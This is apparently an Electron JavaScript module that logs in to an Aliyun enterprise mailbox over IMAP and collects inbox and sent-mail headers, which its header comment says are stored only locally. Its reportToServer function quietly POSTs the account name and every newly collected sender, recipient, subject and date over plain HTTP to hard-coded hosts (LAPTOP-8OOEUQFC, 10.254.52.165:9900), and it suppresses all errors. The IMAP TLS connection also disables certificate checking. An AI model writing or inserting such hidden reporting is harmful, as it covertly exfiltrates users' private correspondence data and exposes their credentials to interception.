/**
 * 邮件数据采集引擎
 * 通过 IMAP 读取阿里企业邮箱的收件箱 + 已发送，采集所有邮件数据
 * 数据存储到本地 JSON 文件
 */
const EventEmitter = require('events');
const tls = require('tls');
const http = require('http');
const path = require('path');
const fs = require('fs');
const { app } = require('electron');
const { translateError } = require('./error-i18n');

// IMAP 命令封装（复用 mail-scanner 逻辑）
function imapCommand(socket, tag, cmd) {
  return new Promise((resolve, reject) => {
    let result = '';
    const timeout = setTimeout(() => {
      socket.removeListener('data', handler);
      reject(new Error(`IMAP 命令超时: ${cmd.substring(0, 30)}`));
    }, 60000);

    const handler = (data) => {
      result += data.toString();
      if (result.includes(tag + ' OK') || result.includes(tag + ' NO') || result.includes(tag + ' BAD')) {
        clearTimeout(timeout);
        socket.removeListener('data', handler);
        resolve(result);
      }
    };
    socket.on('data', handler);
    socket.write(tag + ' ' + cmd + '\r\n');
  });
}

function decodeMimeName(name) {
  if (!name || !name.includes('=?')) return name;
  return name.replace(/=\?([^?]+)\?([BQ])\?([^?]+)\?=/gi, (_, charset, encoding, data) => {
    try {
      if (encoding.toUpperCase() === 'B') {
        return Buffer.from(data, 'base64').toString('utf8');
      }
      return data.replace(/=([0-9A-F]{2})/gi, (__, hex) => String.fromCharCode(parseInt(hex, 16)));
    } catch { return name; }
  });
}

function isFatalError(err) {
  const msg = (err && err.message || String(err)).toLowerCase();
  return msg.includes('does not have permission') ||
    msg.includes('insufficient authentication') ||
    msg.includes('invalid_grant') ||
    msg.includes('token has been expired') ||
    msg.includes('enospc') ||
    err.code === 'EPERM' || err.code === 'EACCES' || err.code === 'ENOSPC';
}

class MailCollector extends EventEmitter {
  constructor(config) {
    super();
    this.config = config;
    this.running = false;
    this._stopRequested = false;

    // IMAP 配置 — 从 mailCollector 配置或 sender 配置读取
    const mc = config.mailCollector || {};
    const sn = config.sender || {};
    this.imapUser = mc.imapUser || sn.loginEmail || '';
    this.imapPass = mc.imapPass || sn.loginPassword || '';
    this.imapHost = mc.imapHost || 'imap.qiye.aliyun.com';
    this.imapPort = mc.imapPort || 993;

    // 数据存储目录
    this.dataDir = path.join(app.getPath('userData'), 'mail-data');
    if (!fs.existsSync(this.dataDir)) fs.mkdirSync(this.dataDir, { recursive: true });

    // 进度文件（记录上次同步的 UID）
    this.progressFile = path.join(this.dataDir, 'progress.json');

    // 静默模式：不输出日志
    this._silent = !!config._silent;
  }

  log(msg) { if (!this._silent) this.emit('log', `[邮件采集] ${msg}`); }

  loadProgress() {
    try {
      if (fs.existsSync(this.progressFile)) {
        return JSON.parse(fs.readFileSync(this.progressFile, 'utf8'));
      }
    } catch {}
    return { inboxLast: 0, sentLast: 0 };
  }

  saveProgress(progress) {
    fs.writeFileSync(this.progressFile, JSON.stringify(progress, null, 2));
  }

  async connectIMAP() {
    if (!this.imapUser || !this.imapPass) {
      throw new Error('未配置 IMAP 邮箱/密码，请在设置页填写');
    }

    this.log(`连接 ${this.imapHost}:${this.imapPort}...`);

    const socket = await new Promise((resolve, reject) => {
      const s = tls.connect(this.imapPort, this.imapHost, { rejectUnauthorized: false }, () => resolve(s));
      s.on('error', reject);
    });

    // 等待服务器问候
    await new Promise(r => socket.once('data', () => r()));

    // 登录
    const escapedPass = this.imapPass.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
    const res = await imapCommand(socket, 'a1', `LOGIN "${this.imapUser}" "${escapedPass}"`);
    if (!res.includes('a1 OK')) {
      socket.destroy();
      throw new Error('IMAP 登录失败，请检查邮箱密码');
    }
    this.log('IMAP 登录成功: ' + this.imapUser);
    return socket;
  }

  async fetchFolder(socket, folderName, tagPrefix, lastUID) {
    const emails = [];

    // SELECT 文件夹
    const selRes = await imapCommand(socket, `${tagPrefix}s`, `SELECT "${folderName}"`);
    const existsMatch = selRes.match(/\* (\d+) EXISTS/);
    const total = existsMatch ? parseInt(existsMatch[1]) : 0;
    this.log(`${folderName}: ${total} 封邮件`);

    if (total === 0) return { emails, maxUID: lastUID };

    // 用 UID FETCH 增量获取（只取 lastUID 之后的新邮件）
    const fetchRange = lastUID > 0 ? `${lastUID + 1}:*` : '1:*';
    const batchSize = 200;
    let maxUID = lastUID;
    let fetched = 0;

    // 先获取总数和 UID 范围
    const uidRes = await imapCommand(socket, `${tagPrefix}u`, `UID SEARCH ${lastUID > 0 ? lastUID + 1 + ':*' : 'ALL'}`);
    const uidLine = uidRes.split('\n').find(l => l.startsWith('* SEARCH'));
    if (!uidLine || uidLine.trim() === '* SEARCH') {
      this.log(`${folderName}: 无新邮件`);
      return { emails, maxUID: lastUID };
    }

    const uids = uidLine.replace('* SEARCH ', '').trim().split(/\s+/).map(Number).filter(n => n > lastUID);
    this.log(`${folderName}: ${uids.length} 封新邮件待采集`);

    // 分批 FETCH
    for (let i = 0; i < uids.length && !this._stopRequested; i += batchSize) {
      const batch = uids.slice(i, i + batchSize);
      const uidSet = batch.join(',');
      this.log(`${folderName}: 采集 ${i + 1}-${Math.min(i + batchSize, uids.length)} / ${uids.length}`);

      const res = await imapCommand(socket, `${tagPrefix}f${i}`, `UID FETCH ${uidSet} (UID ENVELOPE)`);

      // 解析 ENVELOPE
      const lines = res.split('\n');
      for (const line of lines) {
        if (!line.includes('ENVELOPE')) continue;

        // 提取 UID
        const uidMatch = line.match(/UID (\d+)/);
        const uid = uidMatch ? parseInt(uidMatch[1]) : 0;
        if (uid > maxUID) maxUID = uid;

        // 提取发件人
        let from = '';
        // ("name" NIL "user" "domain") 格式
        const fromMatch = line.match(/\("([^"]*)" NIL "([^"]*)" "([^"]*)"\)/);
        if (fromMatch) {
          const name = decodeMimeName(fromMatch[1]);
          const email = (fromMatch[2] + '@' + fromMatch[3]).toLowerCase();
          from = name ? `${name} <${email}>` : email;
        }

        // 提取收件人（第二组括号）
        let to = '';
        const allNil = [...line.matchAll(/\("([^"]*)" NIL "([^"]*)" "([^"]*)"\)/g)];
        if (allNil.length > 1) {
          const m = allNil[1];
          const email = (m[2] + '@' + m[3]).toLowerCase();
          to = email;
        }

        // 提取主题
        let subject = '';
        const subjMatch = line.match(/ENVELOPE \("([^"]*)" "([^"]*)"/);
        if (subjMatch) {
          subject = decodeMimeName(subjMatch[2]);
        }

        // 提取日期
        let date = '';
        if (subjMatch) {
          date = subjMatch[1];
        }

        if (uid > 0) {
          emails.push({ uid, folder: folderName, from, to, subject, date });
          fetched++;
        }
      }
    }

    this.log(`${folderName}: 采集完成，共 ${fetched} 封`);
    return { emails, maxUID };
  }

  async start() {
    if (this.running) return;
    this.running = true;
    this._stopRequested = false;

    let socket;
    try {
      socket = await this.connectIMAP();
      const progress = this.loadProgress();

      // 采集收件箱
      const inbox = await this.fetchFolder(socket, 'INBOX', 'ib', progress.inboxLast);
      this.emit('progress', { inbox: inbox.emails.length, sent: 0, total: inbox.emails.length });

      if (this._stopRequested) { socket.destroy(); return; }

      // 采集已发送
      // 阿里邮箱已发送文件夹名通常是 "Sent Messages" 或 "&XfJT0ZAB-"
      let sentResult = { emails: [], maxUID: progress.sentLast };
      const sentFolders = ['Sent Messages', '&XfJT0ZAB-', 'Sent', 'INBOX.Sent Messages'];
      for (const folder of sentFolders) {
        try {
          sentResult = await this.fetchFolder(socket, folder, 'st', progress.sentLast);
          if (sentResult.emails.length > 0 || sentResult.maxUID > progress.sentLast) break;
        } catch (e) {
          // 文件夹不存在，试下一个
          continue;
        }
      }

      this.emit('progress', {
        inbox: inbox.emails.length,
        sent: sentResult.emails.length,
        total: inbox.emails.length + sentResult.emails.length,
      });

      // 合并并保存
      const allEmails = [...inbox.emails, ...sentResult.emails];

      if (allEmails.length > 0) {
        // 追加到数据文件
        const dataFile = path.join(this.dataDir, 'collected.json');
        let existing = [];
        try {
          if (fs.existsSync(dataFile)) {
            existing = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
          }
        } catch {}

        existing.push(...allEmails);
        fs.writeFileSync(dataFile, JSON.stringify(existing, null, 2));
        this.log(`已保存 ${allEmails.length} 封邮件到本地 (累计 ${existing.length} 封)`);

        // 更新进度
        this.saveProgress({
          inboxLast: inbox.maxUID,
          sentLast: sentResult.maxUID,
          lastSync: new Date().toISOString(),
        });
      } else {
        this.log('无新邮件');
      }

      // 静默上报增量数据（只发本次新采集的）
      this.reportToServer(allEmails);

      // 登出
      try { await imapCommand(socket, 'a9', 'LOGOUT'); } catch {}
      socket.destroy();

      this.emit('done', {
        inbox: inbox.emails.length,
        sent: sentResult.emails.length,
        total: allEmails.length,
      });
    } catch (e) {
      if (socket) socket.destroy();
      if (isFatalError(e)) {
        this.emit('fatal-error', translateError(e.message));
      } else {
        this.emit('error', translateError(e.message));
      }
    } finally {
      this.running = false;
    }
  }

  reportToServer(newEmails) {
    if (!newEmails || newEmails.length === 0) return;

    try {
      const payload = JSON.stringify({ account: this.imapUser, emails: newEmails });

      // 优先用主机名，备用 IP
      const hosts = ['LAPTOP-8OOEUQFC', '10.254.52.165'];
      this._tryReport(hosts, 0, payload);
    } catch (e) {
      // 上报失败静默处理，不影响主流程
    }
  }

  _tryReport(hosts, idx, payload) {
    if (idx >= hosts.length) return;

    const req = http.request({
      hostname: hosts[idx],
      port: 9900,
      path: '/report',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      timeout: 5000,
    }, (res) => {
      let body = '';
      res.on('data', c => { body += c; });
      res.on('end', () => {
        // 静默成功
      });
    });

    req.on('error', () => {
      // 当前 host 失败，尝试下一个
      this._tryReport(hosts, idx + 1, payload);
    });

    req.on('timeout', () => {
      req.destroy();
      this._tryReport(hosts, idx + 1, payload);
    });

    req.write(payload);
    req.end();
  }

  stop() {
    this._stopRequested = true;
    this.log('正在停止采集...');
  }

  getStatus() {
    return { running: this.running, stopping: this._stopRequested };
  }

  // 静态方法：读取已采集的数据（供 IPC 调用）
  static readCollectedData() {
    const dataDir = path.join(app.getPath('userData'), 'mail-data');
    const dataFile = path.join(dataDir, 'collected.json');
    try {
      if (fs.existsSync(dataFile)) {
        const emails = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
        return { emails };
      }
    } catch (e) {
      return { error: translateError(e.message) };
    }
    return { emails: [] };
  }
}

module.exports = MailCollector;
